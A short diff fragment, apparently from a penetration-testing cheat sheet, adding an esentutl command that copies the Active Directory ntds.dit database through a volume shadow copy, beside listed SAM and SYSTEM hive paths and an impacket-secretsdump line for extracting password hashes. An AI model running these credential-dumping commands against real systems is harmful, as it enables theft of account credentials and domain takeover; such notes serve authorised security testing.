@@ -130,6 +130,10 @@ print(cmd)
 - C:\windows.old\System32\SAM
 - C:\windows.old\System32\SYSTEM
 
+``` powershell
+esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\folder\ntds.dit
+```
+
 ``` bash
 impacket-secretsdump -system SYSTEM -sam SAM LOCAL
 
